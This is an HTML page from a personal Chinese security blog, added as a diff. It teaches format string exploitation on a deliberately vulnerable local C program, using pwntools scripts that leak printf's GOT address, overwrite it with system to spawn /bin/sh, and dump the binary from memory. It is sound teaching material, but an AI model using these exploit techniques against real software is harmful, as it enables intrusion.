@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="https://niwbie.github.io">
+  <title>格式化字符串漏洞的利用 | isee&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞的利用">
+<meta property="og:url" content="https://niwbie.github.io/2016/04/03/格式化字符串漏洞的利用/index.html">
+<meta property="og:site_name" content="isee'blog">
+<meta property="og:description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/3.png">
+<meta property="og:updated_time" content="2017-11-12T08:35:00.841Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串漏洞的利用">
+<meta name="twitter:description" content="我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？这一节主要熟悉一下pwntools的使用。
+首先我们来看源程序：
+123456789101112#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv)&amp;#123;	char a[1024];		while(1)&amp;#123;		memset(a, &amp;apos">
+<meta name="twitter:image" content="https://niwbie.github.io/image/格式化字符串漏洞的利用/1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/image/favicon.ico">
+  
+  <link rel="stylesheet" href="/main.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/image/favicon.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">isee</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">从未放弃治疗</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/">相册</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a class="js-smart-menu" data-idx="0" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="1" href="javascript:void(0)">标签</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="2" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="3" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="rss" target="_blank" href="#" title="rss">rss</a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-list"></i></div>
+  		<h1 class="header-author js-mobile-header hide">isee</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				
+					<img src="/image/favicon.jpg" class="js-avatar">
+				
+			</div>
+			<hgroup>
+			  <h1 class="header-author">isee</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">从未放弃治疗</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/">相册</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="#" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap">
+        <article id="post-格式化字符串漏洞的利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      格式化字符串漏洞的利用
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<p>我们知道格式化字符串漏洞可以向内存中写入数据，那么要如何利用这个漏洞获得shell呢？<br>这一节主要熟悉一下pwntools的使用。</p>
+<p>首先我们来看源程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv)&#123;</div><div class="line">	char a[1024];	</div><div class="line">	while(1)&#123;</div><div class="line">		memset(a, &apos;\0&apos;, 1024);</div><div class="line">		read(0, a, 1024);</div><div class="line">		printf(a);</div><div class="line">		fflush(stdout);</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>gcc -m32 -fno-protector -O0 fmttest.c -o fmttest<br>程序编译时开启了栈保护。</p>
+<p>在这个程序中，我们为了实验方便，循环读取输入，然后使用printf输出。<br>很明显可以看出这里存在格式化字符串漏洞。那么为了写入shell，我们的思路是将printf函数的地址改成system函数的地址，这样当我们再次输入”/bin/sh”时，就可以获得shell了。</p>
+<p>先说一个知识点，就是格式化字符串中的”$”<br>一般情况下，如果我们的字符串为”%x”，就会将取1个参数，那么如果是”%3$x”，则是取出第三个参数。即利用”$”可以取出任意位置的参数。利用这点，可以做很多是，比如dump处程序的bin文件。</p>
+<p>当”$”取出的第N个参数刚好是该字符串的地址是，我们称N为offset。<br>比如当 N=4 时，我们可以构造这样一个payload： addr + “%4$s” ，那么printf就会打印出addr指向的内存的字符串，知道\0为止。这样就是所谓的内存泄露。比如我们利用这样特性， 将addr构造成print函数的地址（print_got）,那么我们就讲得到printf函数在程序中的地址了。</p>
+<p>所以在这题中，可以使用pwntools先获得offset：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">	r = process(&apos;./fmttest&apos;)</div><div class="line">	r.sendline(payload)</div><div class="line">	info = r.recv()</div><div class="line">	r.close()</div><div class="line">	return info</div><div class="line">auto = FmtStr(exec_fmt)</div><div class="line">print auto.offset</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/1.png" alt="这里写图片描述"></p>
+<p>offset为4</p>
+<p>接着在IDA中找到printf的got地址为：0x804a010,然后获取printf函数的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">r = process(&apos;./fmttest&apos;)</div><div class="line"></div><div class="line">print_got = 0x804a010</div><div class="line">payload = p32(print_got) + &apos;%4$s&apos;</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">print_addr = u32(r.recv()[4:8]) #第一次收到后发现不止4个字节，截取有用的</div><div class="line">log.success(&quot;printf_address =&gt; &#123;&#125;&quot;.format(hex(print_addr)))</div></pre></td></tr></table></figure>
+<p><img src="/image/格式化字符串漏洞的利用/2.png" alt="这里写图片描述"></p>
+<p>根据给出的lib（假设是给了的）算出两者的偏移为0xd100，得出system的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">print_system_offset = 0xd100</div><div class="line">read_got = 0x804a00c</div><div class="line">system_addr = print_addr - print_system_offset</div><div class="line"></div><div class="line">log.success(&quot;system =&gt; &#123;&#125;&quot;.format(hex(system_addr)))</div><div class="line">payload = fmtstr_payload(4, &#123;print_got : 0xf7e46310&#125;)</div><div class="line">r.send(payload)</div><div class="line">r.send(&apos;/bin/sh&apos;)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>这样就获取到了shell：<br><img src="/image/格式化字符串漏洞的利用/3.png" alt="这里写图片描述"></p>
+<p>同时，这样的内存泄露也可以用于dump处bin文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">f = open(&apos;source&apos;, &apos;ab+&apos;)</div><div class="line"></div><div class="line">begin = 0x8048000</div><div class="line">offset = 0</div><div class="line"></div><div class="line">while True:</div><div class="line">	addr = begin + offset</div><div class="line">	p = process(&apos;./fmttest&apos;)</div><div class="line">	p.sendline(&quot;%6$saaaa&quot; + p32(addr))</div><div class="line"></div><div class="line">	try:</div><div class="line">		info = p.recvuntil(&apos;aaaa&apos;)[-4]</div><div class="line">	except EOFError:</div><div class="line">		print offset </div><div class="line">		break</div><div class="line"></div><div class="line">	info += &apos;\x00&apos;</div><div class="line">	p.close()</div><div class="line">	offset += len(info)</div><div class="line">	f.write(info)</div><div class="line">	f.flush()</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/04/03/格式化字符串漏洞的利用/" class="archive-article-date">
+  	<time datetime="2016-04-03T03:54:32.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-04-03</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2016/04/12/C函数调用和堆栈/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          C函数调用和堆栈
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/03/17/文件补丁/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件补丁</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+	    <a class="jiathis_button_twitter"></a>
+	    <a class="jiathis_button_plus"></a> 
+	    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="格式化字符串漏洞的利用" data-title="格式化字符串漏洞的利用" data-url="https://niwbie.github.io/2016/04/03/格式化字符串漏洞的利用/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"isee233"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 isee
+    	</div>
+        <span id="busuanzi_container_site_pv">
+             <i class="fa fa-flag"></i>    你是第<span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span>个到访的小伙伴
+        </span>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e437fc8d2c87edc2105c789a41592718";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script src="/./main.js"></script>
+
+
+    
+<div class="tools-col">
+  <ul class="btn-wrap">
+    
+      <li class="chose" data-hook="tools-section-all"><span class="text">全部</span><i class="icon-book"></i></li>
+    
+    
+      <li data-hook="tools-section-tag"><span class="text">标签</span><i class="icon-price-tags"></i></li>
+    
+    
+      <li data-hook="tools-section-friends"><span class="text">友链</span><i class="icon-link"></i></li>
+    
+    
+      <li data-hook="tools-section-me"><span class="text">我</span><i class="icon-smile"></i></li>
+    
+  </ul>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all chose">
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-tag">
+    			<div class="widget tagcloud" id="js-tagcloud">
+    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/神经网络/" style="font-size: 10px;">神经网络</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    			</div>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends">
+  		
+  			<div class="friends-wrap" id="js-friends">
+  			
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.youngroe.com/">Lyon&#39;s blog</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="https://amywushu.github.io/">Amywushu</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://biubiubiu.info/">biubiubiu</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="https://cookiezh.github.io/">cookiezh</a>
+  	        
+  	        </div>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">汪！</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
